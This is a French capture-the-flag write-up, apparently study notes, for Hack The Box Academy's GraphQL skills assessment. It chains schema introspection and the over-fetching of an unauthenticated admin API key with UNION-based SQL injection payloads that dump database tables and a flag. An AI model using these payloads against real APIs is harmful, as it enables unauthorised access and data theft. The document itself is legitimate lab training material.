---
titre: "Skills Assessment — Write-up"
aliases:
  - "Skills Assessment — Write-up"
plateforme: "Hack The Box Academy"
module: "Attacking GraphQL"
date: 2026-07-06
tags: [HTB, GraphQL, SkillsAssessment, WriteUp, SQLi, Notes]
---

# 🏆 Skills Assessment — Write-up

Lié : [[Attacking GraphQL - Index]] · [[01 - Méthodologie - Cheminement GraphQL]] · [[05 - Injection Attacks]]

---

## Contexte

Cible : `http://<TARGET>:<PORT>/graphql` (GraphiQL exposé).
Moteur : **Graphene** (Python).
Objectif : exfiltrer le flag de la base de données.

---

## Phase 1 — Reconnaissance

### Fingerprint
```bash
python3 /opt/graphw00f/main.py -d -f -t http://<TARGET>:<PORT>
# → Graphene, introspection activée par défaut
```

### Introspection — types
```graphql
{ __schema { types { name } } }
```

Types métier identifiés :
- `EmployeeObject` (username, employeeId, role)
- `ProductObject` (name, stock)
- **`ApiKeyObject`** (id, role, **key**) ← intrus, cible potentielle
- `CustomerObject` (firstName, lastName, address)

Mutations : `AddEmployee`, `AddProduct`, `AddCustomer`

### Introspection — queries
```graphql
{ __schema { queryType { fields { name args { name type { name kind } } } } } }
```

| Query | Arguments | Retourne |
|---|---|---|
| `allEmployees` | aucun | `[EmployeeObject]` |
| `employeeByUsername` | `username!` | `EmployeeObject` |
| `allProducts` | aucun | `[ProductObject]` |
| `productByName` | `name!` | `ProductObject` |
| **`activeApiKeys`** | **aucun** | `[ApiKeyObject]` |
| `allCustomers` | `apiKey!` | `[CustomerObject]` |
| `customerByName` | `apiKey!`, `lastName!` | `CustomerObject` |

**Observation clé** : `activeApiKeys` n'a **aucun argument** = accessible sans contrôle. Les queries `allCustomers` et `customerByName` exigent une `apiKey`.

---

## Phase 2 — Over-fetching des clés API

```graphql
{ activeApiKeys { id role key } }
```

Résultat :
| role | key (hash MD5) |
|---|---|
| guest | `fbb64ce26fbe8a8d8d6895b8e6ba21a3` |
| guest | `9cf8622bbc9fdc78f245663e08e5b4c1` |
| **admin** | **`0711a879ed751e63330a78a4b195bbad`** |

→ On a la **clé API admin**, récupérée sans aucune authentification.

---

## Phase 3 — Utiliser la clé admin

```graphql
{
  allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {
    id firstName lastName address
  }
}
```

→ 3 customers civils, **aucun flag dans les données GraphQL**.

**Constat** : le flag n'est nulle part dans le schéma GraphQL → il est dans une **table de la base de données non exposée** → il faut une **SQLi**.

---

## Phase 4 — Trouver le point d'injection SQL

Tester une apostrophe sur chaque argument String :

| Query | Argument | `test'` | `test' -- -` | Résultat |
|---|---|---|---|---|
| `employeeByUsername` | `username` | null | null | Non concluant |
| `productByName` | `name` | null | null | Non concluant |
| **`customerByName`** | **`lastName`** | null | **données de Blair** | ✅ **SQLi confirmée** |

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Blair' -- -") {
    firstName lastName
  }
}
```
→ Renvoie Blair → le `-- -` a commenté le guillemet fermant → injection validée.

---

## Phase 5 — Exploitation SQLi UNION

### Nombre de colonnes

`CustomerObject` a 4 champs → UNION SELECT 1,2,3,4 :

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,2,3,4 -- -") {
    firstName lastName address
  }
}
```

### Dumper les tables

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() -- -") {
    firstName
  }
}
```
→ Tables trouvées : `employee, product, apikey, customer, flag`

### Dumper les colonnes de `flag`

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='flag' -- -") {
    firstName
  }
}
```
→ Colonne : `flag`

### Exfiltrer le flag

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,GROUP_CONCAT(flag),3,4 FROM flag -- -") {
    firstName
  }
}
```

→ **`HTB{f1d663c11e6db634e1c9403d0e8e3a35}`** ✅

---

## Résumé de la chaîne d'attaque

```
1. Introspection       → cartographie complète du schéma
2. Over-fetching       → activeApiKeys sans argument → clé admin récupérée
3. Test d'injection    → apostrophe sur tous les args String
4. SQLi confirmée      → customerByName(lastName:) injectable
5. UNION SELECT        → dump tables cachées → table flag
6. Exfiltration        → GROUP_CONCAT(flag) FROM flag → HTB{...}
```

**Vulnérabilités combinées** :
- **Information Disclosure** (introspection activée)
- **Over-fetching** (clés API accessibles sans auth)
- **SQL Injection** (argument non paramétré dans `customerByName`)
- La SQLi sort du bac à sable GraphQL pour atteindre des tables non exposées

---

## Leçons retenues

1. **Toujours commencer par l'introspection totale** avant d'explorer à la main. Le dump complet + Voyager donne la carte en 30 secondes.
2. **L'intrus dans les types** (`ApiKeyObject`) est souvent la piste principale.
3. **Une query sans argument** (`activeApiKeys`) = souvent un défaut de contrôle d'accès.
4. **Tester l'injection sur TOUS les arguments String**, pas seulement le premier trouvé.
5. **Si le flag n'est pas dans le schéma GraphQL, il est en base** → SQLi obligatoire pour y accéder.
6. **La clé admin obtenue par over-fetching** débloque les queries protégées → qui contiennent le point d'injection → chaîne d'attaque en cascade.
